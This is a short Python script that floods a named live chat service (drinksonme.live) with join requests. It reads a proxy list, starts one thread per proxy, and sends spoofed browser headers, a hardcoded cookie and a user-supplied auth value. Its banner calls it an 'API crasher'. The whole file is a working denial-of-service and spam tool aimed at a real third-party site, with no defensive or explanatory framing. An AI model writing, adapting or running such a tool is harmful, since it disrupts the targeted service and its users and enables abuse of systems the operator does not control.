import requests
import threading, os


def sendreq(prx, basic):
    r = requests.post('https://drinksonme.live/api/chitchat-group/enter', json={"nickName":"craashinggg","counterId":"","drinkId":5,"ageRange":None,"language":"TH"},proxies={"http": "http://{prx}"}, headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9,th;q=0.8',
            'basic': basic,
            'content-type': 'application/json',
            'cookie': '_ga=GA1.1.189523476.1681134021; _ga_HRKHHYNFJS=GS1.1.1681134021.1.1.1681134178.0.0.0',
            'origin': 'https://drinksonme.live',
            'referer': 'https://drinksonme.live/app',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        })
    print(prx)
    print(r.json())
    #print(r.json())
#for _ in range(20):
os.system('cls')
print("DRINK ON ME API CRASHEREERERER")
a = input("basic id : ")
os.system('pause')
f = open("proxyies.txt", "r")
for lines in f:
    threading.Thread(target=sendreq, args=[lines, a]).start()

